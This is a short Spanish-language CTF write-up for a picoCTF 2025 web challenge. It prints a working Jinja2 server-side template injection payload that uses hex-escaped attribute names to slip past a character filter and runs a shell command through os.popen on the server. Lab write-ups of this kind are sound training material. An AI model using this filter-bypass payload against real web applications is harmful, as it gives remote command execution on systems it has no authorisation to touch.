### Descripcion
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:52031/)!
### Solucion
Este reto es la continuacion del otro y si lo logre hacer en el evento de picoCTF2025
Si nosotros pasabamos lo que pasamos en el reto anterior, esto nos decia que estaba filtrando por algo.
Hicimos varios intentos, y fuimos viendo que filtraba por algunas cosas y ahi vemos.
Entonces nos fuimos a payloads all the things la vieja confiable, y buscamos un filtro que nos sirva, en este caso, este sirvió

Aqui hay una seccion de bypass
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md


```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
### Tags
